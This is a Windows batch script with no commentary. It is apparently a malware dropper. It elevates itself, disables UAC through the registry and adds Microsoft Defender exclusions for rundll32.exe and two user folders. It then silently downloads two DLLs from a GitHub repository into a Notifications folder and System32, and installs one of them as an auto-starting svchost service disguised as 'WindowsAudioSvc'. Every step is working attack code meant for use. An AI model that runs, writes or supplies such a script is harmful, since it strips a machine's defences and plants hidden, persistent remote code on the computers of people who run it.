@echo off
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
cd /d "%~dp0"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1


powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Windows\Notifications'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Local\Temp'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'rundll32.exe'" >nul 2>&1

set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\Windows\Notifications"
set "LDR_PATH=%TARGET_DIR%\msvcrt_extra_beta.dll"
set "SVC_DLL=%SystemRoot%\System32\winws_service.dll"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

curl.exe -sL -o "%LDR_PATH%" "https://github.com/akucursed/z/raw/refs/heads/main/msvcrt_extra_beta.dll"
curl.exe -sL -o "%SVC_DLL%" "https://github.com/akucursed/z/raw/refs/heads/main/service.dll"

if exist "%SVC_DLL%" (
    set "SERVICE_NAME=WindowsAudioSvc"
    
    sc stop !SERVICE_NAME! >nul 2>&1
    sc delete !SERVICE_NAME! >nul 2>&1
    
    sc create !SERVICE_NAME! binPath= "%SystemRoot%\System32\svchost.exe -k AudioGroup" type= share start= auto >nul 2>&1
    
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\!SERVICE_NAME!\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SVC_DLL%" /f >nul 2>&1
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\!SERVICE_NAME!\Parameters" /v ServiceMain /t REG_SZ /d "ServiceMain" /f >nul 2>&1
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\!SERVICE_NAME!\Parameters" /v ServiceDllUnloadOnStop /t REG_DWORD /d 1 /f >nul 2>&1
    
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v AudioGroup /t REG_MULTI_SZ /d "!SERVICE_NAME!" /f >nul 2>&1
    
    sc start !SERVICE_NAME! >nul 2>&1
)

pause
